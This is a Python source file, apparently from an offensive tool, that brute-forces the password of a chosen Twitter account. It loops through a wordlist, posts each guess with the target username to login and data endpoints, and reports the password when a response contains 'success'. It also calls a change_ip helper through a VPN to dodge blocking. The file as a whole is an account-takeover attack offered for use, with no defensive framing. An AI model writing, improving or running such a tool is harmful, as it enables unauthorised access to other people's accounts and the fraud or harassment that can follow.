import os
import sys
import requests
from rich.console import Console
from utils.colors import Color
from utils.ui import display_ascii 
from utils.vpn import change_ip
from config import TWITTER_LOGIN_URL, TWITTER_DATA_URL, WORDLIST_DIR
from asciiart import ascii_art

console = Console()


def bruteforce(username, wordlist, vpn_enabled):
    try:
        wl_file = open(wordlist, 'r')
        wl_lines = [line.strip() for line in wl_file.readlines()]
    except FileNotFoundError:
        print(f"\n\nERROR 1x01:{Color.RED} wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n{Color.END}")
        exit()
    
    for password in wl_lines:
        data = {
            "session[username_or_email]": username,
            "session[password]": password
        }
        
        response = requests.post(TWITTER_LOGIN_URL, data=data)
        
        if "success" in response.text:
            os.system("clear")
            display_ascii()
            print(f"{Color.GREEN}Password found: {Color.END}{password}")
            sys.exit(0)
        else:
            os.system("clear")
            display_ascii()
            console.print(password, justify="center", style="#ea0408 bold")
        
        data = {"auth_password": password}
        response = requests.post(TWITTER_DATA_URL, data=data)
        
        if "success" in response.text:
            os.system("clear")
            display_ascii()
            console.print(password, justify="center", style="#13f41e bold")
            sys.exit(0)
        
        if vpn_enabled:
            change_ip()
